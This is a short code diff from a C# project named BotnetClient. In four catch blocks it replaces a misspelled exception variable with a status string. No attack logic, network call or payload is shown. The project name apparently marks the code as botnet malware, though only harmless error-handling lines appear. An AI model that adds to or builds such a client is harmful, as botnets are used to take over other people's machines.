@@ -59,7 +59,7 @@ namespace BotnetClient
             }
             catch (Exception exc)
             {
-                excexption = exc;
+                status = exc.ToString();
             }
 
         }
@@ -82,7 +82,7 @@ namespace BotnetClient
             }
             catch (Exception exc)
             {
-                excexption = exc;
+                status = exc.ToString();
             }
         }
 
@@ -107,7 +107,7 @@ namespace BotnetClient
             }
             catch (Exception exc)
             {
-                excexption = exc;
+                status = exc.ToString();
             }
         }
 
@@ -125,7 +125,7 @@ namespace BotnetClient
             }
             catch (Exception exc)
             {
-                excexption = exc;
+                status = exc.ToString();
             }
         }
     }
